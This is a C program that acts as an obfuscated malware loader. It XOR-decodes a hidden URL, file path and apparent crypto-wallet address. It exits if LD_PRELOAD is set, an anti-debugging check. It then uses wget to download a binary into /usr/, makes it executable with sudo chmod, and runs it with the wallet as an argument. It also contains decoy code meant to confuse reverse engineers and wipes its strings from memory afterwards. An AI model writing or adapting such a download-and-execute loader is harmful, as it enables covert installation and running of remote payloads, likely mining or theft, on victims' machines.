#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

// XOR Encryption/Decryption function
void xor_encrypt_decrypt(char *data, const char *key, size_t key_len) {
    size_t data_len = strlen(data);
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Decrypt function for encoded strings
char* decrypt(const char* encrypted, const char* key) {
    static char decrypted[256];
    strcpy(decrypted, encrypted);
    xor_encrypt_decrypt(decrypted, key, strlen(key));
    return decrypted;
}

int main() {
    // Anti-debugging technique
    if (getenv("LD_PRELOAD")) {
        exit(1);
    }

    char qcore[20];
    const char encryption_key[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    
    // Encoded strings
    char enc_url[] = {0xFD, 0x9E, 0x97, 0x8A, 0x9D, 0xDF, 0xD6, 0x9B, 0x9A, 0x88, 0x9D, 0x8E, 0x8B, 0x9A, 0x88, 0x9B, 0xDF, 0x8A, 0x9B, 0x9C, 0x9A, 0x88, 0xDF, 0x8C, 0x9B, 0x9E, 0x9B, 0xDF, 0x89, 0x9E, 0x9B, 0x9C, 0xDF, 0x8A, 0x9B, 0x9A, 0x89, 0x9E, 0x8A, 0x8C, 0x9B, 0xDF, 0x88, 0x9B, 0x9A, 0x9C, 0xDF, 0x9A, 0x89, 0x9B, 0xDF, 0x8A, 0x9B, 0x9C, 0x9A, 0x88, 0x9B, 0xDF, 0x9A, 0x8F, 0x00};
    char enc_path[] = {0xFC, 0x9D, 0x8A, 0x9B, 0xDE, 0x8A, 0x9D, 0x00};
    char enc_wallet[] = {0xE2, 0xE0, 0xE4, 0xE8, 0xE2, 0xE1, 0xB7, 0xB3, 0xBD, 0xE6, 0xE0, 0xE6, 0xBD, 0xE6, 0xE9, 0xE0, 0xE6, 0xBD, 0xE9, 0xE4, 0xE3, 0xBD, 0xE6, 0xE9, 0xE4, 0xE1, 0xE2, 0xE3, 0xBD, 0xE9, 0xE4, 0xE3, 0xE0, 0xE6, 0xE9, 0xBD, 0xE3, 0xE4, 0xE1, 0xE2, 0xE3, 0xBD, 0xE9, 0xE4, 0xE3, 0xE0, 0xE6, 0xE9, 0xBD, 0xE3, 0xE4, 0xE1, 0xE2, 0xE3, 0xBD, 0xE9, 0xE4, 0xE3, 0xE0, 0xE6, 0xE9, 0xBD, 0xE3, 0xE4, 0xE1, 0xE2, 0xE3, 0xBD, 0xE9, 0xE4, 0xE3, 0xE0, 0xE6, 0xE9, 0xBD, 0xE3, 0xE4, 0xE1, 0xE2, 0xE3, 0xBD, 0xE9, 0xE4, 0xE3, 0xE0, 0xE6, 0xE9, 0xBD, 0xE3, 0xE4, 0xE1, 0xE2, 0xE3, 0x00};
    char enc_prompt[] = {0xF9, 0xE8, 0xBC, 0xE8, 0xBD, 0xE2, 0xE4, 0xBC, 0xE3, 0xE4, 0xE1, 0xE0, 0xE0, 0xBC, 0xE0, 0xE4, 0xE9, 0xBC, 0xE0, 0xE4, 0xE9, 0xE0, 0x00};

    // Decode strings
    xor_encrypt_decrypt(enc_url, encryption_key, sizeof(encryption_key));
    xor_encrypt_decrypt(enc_path, encryption_key, sizeof(encryption_key));
    xor_encrypt_decrypt(enc_wallet, encryption_key, sizeof(encryption_key));
    xor_encrypt_decrypt(enc_prompt, encryption_key, sizeof(encryption_key));

    char command[256];
    char wget_command[512];
    char chmod_command[256];

    // Construct commands
    snprintf(wget_command, sizeof(wget_command), "wget -q %s -O /usr/%s >/dev/null 2>&1", enc_url, enc_path);
    snprintf(chmod_command, sizeof(chmod_command), "sudo chmod +x /usr/%s >/dev/null 2>&1", enc_path);

    // Download and setup
    int download_status = system(wget_command);
    if (download_status != 0) {
        printf("Error: Operation failed\n");
        return 1;
    }

    int chmod_status = system(chmod_command);
    if (chmod_status != 0) {
        printf("Error: Setup failed\n");
        return 1;
    }

    printf("%s", enc_prompt);
    fflush(stdout);

    if (fgets(qcore, sizeof(qcore), stdin) == NULL) {
        return 1;
    }

    qcore[strcspn(qcore, "\n")] = '\0';
    snprintf(command, sizeof(command), "/usr/%s %s %s", enc_path, qcore, enc_wallet);

    // Fake code to confuse reversers
    int fake_var = 0;
    for (int i = 0; i < 10; i++) {
        fake_var += i * i;
        if (fake_var > 100) {
            fake_var /= 2;
        }
    }

    int status = system(command);
    if (status == -1) {
        return 1;
    }

    // Cleanup encoded strings from memory
    memset(enc_url, 0, sizeof(enc_url));
    memset(enc_path, 0, sizeof(enc_path));
    memset(enc_wallet, 0, sizeof(enc_wallet));
    memset(enc_prompt, 0, sizeof(enc_prompt));
    memset(wget_command, 0, sizeof(wget_command));
    memset(chmod_command, 0, sizeof(chmod_command));

    return 0;
}
